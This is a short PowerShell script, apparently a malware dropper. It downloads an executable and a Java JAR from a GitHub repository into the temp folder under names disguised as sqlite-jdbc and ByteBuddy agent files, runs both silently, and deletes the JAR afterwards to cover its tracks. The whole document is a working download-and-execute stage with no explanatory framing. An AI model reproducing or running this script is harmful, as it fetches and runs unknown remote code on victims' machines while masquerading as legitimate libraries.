$link1 = "https://github.com/nowrez/zelenkovcode/raw/main/X.exe"
$outfile1 = "$env:TEMP\sqlite-3.22.0.0-031903ad-38e1-4290-9af9-00b1a04d10e4-sqlitejdbc.exe"
Invoke-WebRequest -Uri "$link1" -OutFile "$outfile1"
Start-Process -Wait -NoNewWindow -FilePath "$outfile1"

$link2 = "https://github.com/nowrez/zelenkovcode/raw/main/ABCD.jar"
$outfile2 = "$env:TEMP\\byteBuddyAgent117246237292487086310.jar"
Invoke-WebRequest -Uri "$link2" -OutFile "$outfile2"
Start-Process -Wait -NoNewWindow -FilePath "java" -ArgumentList "-jar `"$outfile2`""
Remove-Item -Force "$outfile2"
